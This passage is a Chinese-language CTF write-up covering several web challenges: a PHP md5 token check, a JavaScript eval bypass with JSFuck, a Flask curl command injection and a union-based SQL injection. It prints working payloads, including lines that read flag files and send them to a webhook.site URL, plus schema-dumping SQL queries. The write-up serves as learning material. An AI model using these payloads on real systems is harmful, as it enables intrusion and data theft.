class="title">generate_token</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$b64json</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$data</span>));</span><br><span class="line">  <span class="variable">$hmac</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;md5&#x27;</span>, SECRET_KEY . <span class="variable">$b64json</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$b64json</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$hmac</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verify_token</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$token</span></span>) </span>&#123; </span><br><span class="line">  <span class="variable">$token_data</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$token</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;md5&#x27;</span>, SECRET_KEY . <span class="variable">$token_data</span>[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">hash</span>(<span class="string">&#x27;md5&#x27;</span>, SECRET_KEY . <span class="variable">$token_data</span>[<span class="number">0</span>]) == <span class="variable">$token_data</span>[<span class="number">1</span>]) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;eyJ1c2VybmFtZSI6ImFkbWluIiwidXNlcl9rZXkiOiIyNmNlYjY4NWY0NmU2ZDIyIiwiYWRtaW4iOnRydWV9.58fed7114a165282749650cf5458d31f&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">verify_token</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230501145041707.png" alt="image-20230501145041707"></p><p>然后就可以拿到flag了</p><h2 id="Migraine"><a href="#Migraine" class="headerlink" title="Migraine"></a>Migraine</h2><p>题目</p><p><img src="../images/image-20230501145238358.png" alt="image-20230501145238358"></p><p>题目给了个源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8000</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line">process.<span class="title function_">on</span>(<span class="string">&#x27;uncaughtException&#x27;</span>, <span class="function">(<span class="params">err, origin</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname+<span class="string">&#x27;/static/index.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> src = req.<span class="property">body</span>[<span class="string">&#x27;src&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (src.<span class="title function_">match</span>(<span class="regexp">/[A-Za-z0-9]/</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">418</span>).<span class="title function_">end</span>(<span class="string">&#x27;Bad character detected.&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">eval</span>(src);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">418</span>).<span class="title function_">end</span>(<span class="string">&#x27;Error on eval.&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Example app listening on port <span class="subst">$&#123;port&#125;</span>!`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>是一个javascript的命令执行，把数字字母全给过滤掉了，就是无数字字母的rce</p><p>这里的话就得使用jsfuck进行绕过了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;https&quot;</span>).<span class="title function_">get</span>(<span class="string">&quot;https://webhook.site/24e1c10f-df56-4421-8d89-a7ea91aa8610/?flag=&quot;</span>+process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>).<span class="title function_">readFileSync</span>(<span class="string">&quot;/flag.txt&quot;</span>).<span class="title function_">toString</span>())</span><br></pre></td></tr></table></figure><p>这个代码和<strong>ctfshow nodejs</strong>里面的那个一样， 下次遇到的话可以进行参考</p><p>如何进行jsfuck编码，然后到题目里运行，然后在webhook.site就能接收到flag了</p><p><img src="../images/image-20230501203954385.png" alt="image-20230501203954385"></p><h2 id="connect"><a href="#connect" class="headerlink" title="connect"></a>connect</h2><p>题目</p><p><img src="../images/image-20230501161122636.png" alt="image-20230501161122636"></p><p>题目给了源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">escape_shell_cmd</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> <span class="string">&#x27;&amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$\\&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api/curl&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">curl</span>():</span><br><span class="line">    url = flask.request.form.get(<span class="string">&#x27;ip&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> escape_shell_cmd(url):</span><br><span class="line">        command = <span class="string">&quot;curl -s -D - -o /dev/null &quot;</span> + url + <span class="string">&quot; | grep -oP &#x27;^HTTP.+[0-9]&#123;3&#125;&#x27;&quot;</span></span><br><span class="line">        output = os.popen(command).read().strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;HTTP&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> output:</span><br><span class="line">            <span class="keyword">return</span> flask.jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Error: No response&#x27;</span>&#125;)</span><br><span class="line">        <span class="keyword">return</span> flask.jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: output&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> flask.jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Illegal Characters Detected&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8001</span>)</span><br></pre></td></tr></table></figure><p>这里的考点就是curl命令 的使用</p><p>这里先随便拿个题目的网站进行测试，然后抓包</p><p><img src="../images/image-20230501185955703.png" alt="image-20230501185955703"></p><p>发现可以</p><p><img src="../images/image-20230501190019175.png" alt="image-20230501190019175"></p><p>然后测试一下看能否使用  <code>;</code>进行分割</p><p><img src="../images/image-20230501190123233.png" alt="image-20230501190123233"></p><p>发现可以</p><p>然后就用题目给的payload来打了</p><p>先监听端口</p><p><img src="../images/image-20230501190208427.png" alt="image-20230501190208427"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=http://localhost;curl+-d@flag.txt+https://webhook.site/24e1c10f-df56-4421-8d89-a7ea91aa8610</span><br></pre></td></tr></table></figure><p>这里的话用的是专门接收http请求头的一个网站  <a href="https://webhook.site/">https://webhook.site/</a></p><p>这里的话用自己的vps不知道为啥行不通</p><p><img src="../images/image-20230501202013603.png" alt="image-20230501202013603"></p><p>这里的-d是使用POST请求，因为GET请求的话不会返回flag</p><h2 id="Lost-and-Forgotten"><a href="#Lost-and-Forgotten" class="headerlink" title="Lost and Forgotten"></a>Lost and Forgotten</h2><p>我好像忘记了我最近写的文章的密码。请问有没有什么办法可以恢复。</p><p><img src="../images/image-20230501202323192.png" alt="image-20230501202323192"></p><p>考察的是sql注入</p><p><img src="../images/image-20230502150703358.png" alt="image-20230502150703358"></p><p>输入下面的内容的话会把wp全部给输出出来，那么我们就怀疑是不是sql注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; #</span><br></pre></td></tr></table></figure><p>输入下面的语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 union select 1,2,3,4,5,6#</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230502150852836.png" alt="image-20230502150852836"></p><p>返回这结果，那么就说明了是sql注入了，并且在123出都有回显，那么我们就在这几个地方进行sql注入了</p><p><img src="../images/image-20230502151259631.png" alt="image-20230502151259631"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 union select 1,2,(select database()),4,5,6#</span><br></pre></td></tr></table></figure><p>查出数据名</p><p>接着查表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 union select 1,2,(select table_name from information_schema.tables where table_schema = &quot;writeups&quot;),4,5,6#</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230502151547929.png" alt="image-20230502151547929"></p><p>查出表名，接着查列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 union select 1,2,(select column_name from information_schema.columns where table_schema=database() and table_name=&quot;articles&quot; limit 1,1),4,5,6#</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230502151714536.png" alt="image-20230502151714536"></p><p>limit 1,1查出来一个，那么接着往后查</p><p><img src="../images/image-20230502151807267.png" alt="image-20230502151807267"></p><p><img src="../images/image-20230502151829926.png" alt="image-20230502151829926"></p><p><img src="../images/image-20230502151844439.png" alt="image-20230502151844439"></p><p><img src="../images/image-20230502151859864.png" alt="image-20230502151859864"></p><p>最多能查到limit 5,1    之后的就查不到了，那么我们就挨个对列进行内容的读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 union select 1,2,access_code,4,5,6 from articles #</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230502152041491.png" alt="image-20230502152041491"></p><p>最后查到加密后的flag</p><p><img src="../images/image-20230502152333647.png" alt="image-20230502152333647"></p><p>最好放到secret code里面就可以解出flag了</p><h2 id="Web-LTO"><a href="#Web-LTO" class="headerlink" title="Web LTO"></a>Web LTO</h2><p><img src="../images/image-20230501204706377.png" alt="image-20230501204706377"></p><p><img src="../images/image-20230501204726316.png" alt="image-20230501204726316"></p><p><strong>main.rs</strong></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> actix_files::NamedFile;</span><br><span class="line"><span class="keyword">use</span> actix_multipart::Multipart;</span><br><span class="line"><span class="keyword">use</span> actix_web::cookie::Cookie;</span><br><span class="line"><span class="keyword">use</span> actix_web::http::StatusCode;</span><br><span class="line"><span class="keyword">use</span> actix_web::&#123;get, post, App, HttpRequest, HttpResponse, HttpServer, Responder, <span class="type">Result</span>&#125;;</span><br><span class="line"><span class="keyword">use</span> futures_util::stream::TryStreamExt;</span><br><span class="line"><span class="keyword">use</span> futures_util::StreamExt;</span><br><span class="line"><span class="keyword">use</span> rand::&#123;thread_rng, RngCore&#125;;</span><br><span class="line"><span class="keyword">use</span> std::collections::hash_map::DefaultHasher;</span><br><span class="line"><span class="keyword">use</span> std::fs::create_dir_all;</span><br><span class="line"><span class="keyword">use</span> std::hash::&#123;Hash, Hasher&#125;;</span><br><span class="line"><span class="keyword">use</span> std::io::&#123;ErrorKind, SeekFrom&#125;;</span><br><span class="line"><span class="keyword">use</span> std::path::PathBuf;</span><br><span class="line"><span class="keyword">use</span> std::<span class="type">str</span>::FromStr;</span><br><span class="line"><span class="keyword">use</span> tokio::fs::&#123;remove_file, write, File, OpenOptions&#125;;</span><br><span class="line"><span class="keyword">use</span> tokio::io::AsyncReadExt;</span><br><span class="line"><span class="keyword">use</span> tokio::io::&#123;copy, AsyncSeekExt&#125;;</span><br><span class="line"><span class="keyword">use</span> tokio_util::io::StreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">handle_multipart</span>(user_dir: &amp;PathBuf, <span class="keyword">mut</span> multipart: Multipart) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">count</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// optimised from: https://github.com/actix/examples/blob/db5f00e771573023a1d3de402f47a661c5799ec9/forms/multipart/src/main.rs#L8</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">let</span> <span class="variable">Some</span>(field) = multipart.<span class="title function_ invoke__">try_next</span>().<span class="keyword">await</span>? &#123;</span><br><span class="line">        count += <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> count &gt; <span class="number">16</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">Err</span>(std::io::Error::<span class="title function_ invoke__">new</span>(</span><br><span class="line">                ErrorKind::InvalidInput,</span><br><span class="line">                <span class="string">&quot;Too many files provided in input!&quot;</span>,</span><br><span class="line">            )</span><br><span class="line">            .<span class="title function_ invoke__">into</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">content_disposition</span> = field.<span class="title function_ invoke__">content_disposition</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(filename) = content_disposition.<span class="title function_ invoke__">get_filename</span>() &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">hasher</span> = DefaultHasher::<span class="title function_ invoke__">new</span>();</span><br><span class="line">            filename.<span class="title function_ invoke__">hash</span>(&amp;<span class="keyword">mut</span> hasher);</span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">tmp</span> = PathBuf::<span class="title function_ invoke__">from_str</span>(<span class="string">&quot;tmp/&quot;</span>).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">            tmp.<span class="title function_ invoke__">push</span>(<span class="built_in">format!</span>(<span class="string">&quot;&#123;:016x&#125;&quot;</span>, hasher.<span class="title function_ invoke__">finish</span>()));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">file</span> = OpenOptions::<span class="title function_ invoke__">new</span>()</span><br><span class="line">                .<span class="title function_ invoke__">read</span>(<span class="literal">true</span>)</span><br><span class="line">                .<span class="title function_ invoke__">write</span>(<span class="literal">true</span>)</span><br><span class="line">                .<span class="title function_ invoke__">create</span>(<span class="literal">true</span>)</span><br><span class="line">                .<span class="title function_ invoke__">open</span>(&amp;tmp)</span><br><span class="line">                .<span class="keyword">await</span>?;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">freader</span> = StreamReader::<span class="title function_ invoke__">new</span>(field.<span class="title function_ invoke__">map</span>(|result| &#123;</span><br><span class="line">                <span class="comment">// StreamReader-friendly</span></span><br><span class="line">                result.<span class="title function_ invoke__">map_err</span>(|err| std::io::Error::<span class="title function_ invoke__">new</span>(ErrorKind::Other, err))</span><br><span class="line">            &#125;))</span><br><span class="line">            .<span class="title function_ invoke__">take</span>(<span class="number">1</span> &lt;&lt; <span class="number">16</span>); <span class="comment">// max file size</span></span><br><span class="line"></span><br><span class="line">            <span class="title function_ invoke__">copy</span>(&amp;<span class="keyword">mut</span> freader, &amp;<span class="keyword">mut</span> file).<span class="keyword">await</span>?;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// upload succeeded; copy to user area</span></span><br><span class="line">            <span class="keyword">let</span> <span class="variable">destination</span> = user_dir.<span class="title function_ invoke__">join</span>(</span><br><span class="line">                tmp.<span class="title function_ invoke__">file_name</span>()</span><br><span class="line">                    .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Must be present based on filename creation.&quot;</span>),</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// avoid overhead from open()</span></span><br><span class="line">            file.<span class="title function_ invoke__">seek</span>(SeekFrom::<span class="title function_ invoke__">Start</span>(<span class="number">0</span>)).<span class="keyword">await</span>?;</span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">orig</span> = file;</span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">dest</span> = File::<span class="title function_ invoke__">create</span>(&amp;destination).<span class="keyword">await</span>?;</span><br><span class="line"></span><br><span class="line">            <span class="title function_ invoke__">copy</span>(&amp;<span class="keyword">mut</span> orig, &amp;<span class="keyword">mut</span> dest).<span class="keyword">await</span>?;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// cleanup</span></span><br><span class="line">            <span class="title function_ invoke__">drop</span>(orig);</span><br><span class="line">            <span class="title function_ invoke__">drop</span>(dest);</span><br><span class="line">            <span class="title function_ invoke__">remove_file</span>(tmp).<span class="keyword">await</span>?;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">Err</span>(std::io::Error::<span class="title function_ invoke__">new</span>(</span><br><span class="line">                ErrorKind::InvalidInput,</span><br><span class="line">                <span class="string">&quot;Missing filename from provided file.&quot;</span>.<span class="title function_ invoke__">to_string</span>(),</span><br><span class="line">            )</span><br><span class="line">            .<span class="title function_ invoke__">into</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[post(<span class="string">&quot;/&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">upload</span>(req: HttpRequest, multipart: Multipart) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;HttpResponse&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(user) = req.<span class="title function_ invoke__">cookie</span>(<span class="string">&quot;whoami&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">hasher</span> = DefaultHasher::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        user.<span class="title function_ invoke__">value</span>().<span class="title function_ invoke__">hash</span>(&amp;<span class="keyword">mut</span> hasher);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">user_dir</span> = PathBuf::<span class="title function_ invoke__">from</span>(<span class="built_in">format!</span>(<span class="string">&quot;user/&#123;:016x&#125;&quot;</span>, hasher.<span class="title function_ invoke__">finish</span>()));</span><br><span class="line">        <span class="title function_ invoke__">create_dir_all</span>(&amp;user_dir)?;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Err</span>(e) = <span class="title function_ invoke__">handle_multipart</span>(&amp;user_dir, multipart).<span class="keyword">await</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">write</span>(user_dir.<span class="title function_ invoke__">join</span>(<span class="string">&quot;error&quot;</span>), e.<span class="title function_ invoke__">to_string</span>()).<span class="keyword">await</span>?;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">body</span> = <span class="type">Vec</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">tar</span> = tar::Builder::<span class="title function_ invoke__">new</span>(&amp;<span class="keyword">mut</span> body);</span><br><span class="line">        tar.<span class="title function_ invoke__">append_dir_all</span>(<span class="string">&quot;submitted&quot;</span>, user_dir)?;</span><br><span class="line">        <span class="title function_ invoke__">drop</span>(tar);</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(HttpResponse::<span class="title function_ invoke__">build</span>(StatusCode::OK)</span><br><span class="line">            .<span class="title function_ invoke__">content_type</span>(<span class="string">&quot;application/tar&quot;</span>)</span><br><span class="line">            .<span class="title function_ invoke__">insert_header</span>((<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment&quot;</span>))</span><br><span class="line">            .<span class="title function_ invoke__">body</span>(body)</span><br><span class="line">            .<span class="title function_ invoke__">respond_to</span>(&amp;req)</span><br><span class="line">            .<span class="title function_ invoke__">map_into_boxed_body</span>())</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(HttpResponse::<span class="title function_ invoke__">new</span>(StatusCode::UNAUTHORIZED))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[get(<span class="string">&quot;/&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">index</span>(req: HttpRequest) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;HttpResponse&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">res</span> = NamedFile::<span class="title function_ invoke__">open</span>(<span class="string">&quot;www/index.html&quot;</span>)?.<span class="title function_ invoke__">into_response</span>(&amp;req);</span><br><span class="line">    <span class="keyword">if</span> req.<span class="title function_ invoke__">cookie</span>(<span class="string">&quot;whoami&quot;</span>).<span class="title function_ invoke__">is_none</span>() &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">rng</span> = <span class="title function_ invoke__">thread_rng</span>();</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">ident</span> = [<span class="number">0u8</span>; <span class="number">256</span>]; <span class="comment">// big un-bruteforce-able bytes</span></span><br><span class="line">        rng.<span class="title function_ invoke__">fill_bytes</span>(&amp;<span class="keyword">mut</span> ident);</span><br><span class="line">        res.<span class="title function_ invoke__">add_cookie</span>(</span><br><span class="line">            &amp;Cookie::<span class="title function_ invoke__">build</span>(<span class="string">&quot;whoami&quot;</span>, hex::<span class="title function_ invoke__">encode</span>(ident))</span><br><span class="line">                .<span class="title function_ invoke__">http_only</span>(<span class="literal">true</span>)</span><br><span class="line">                .<span class="title function_ invoke__">finish</span>(),</span><br><span class="line">        )?;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ 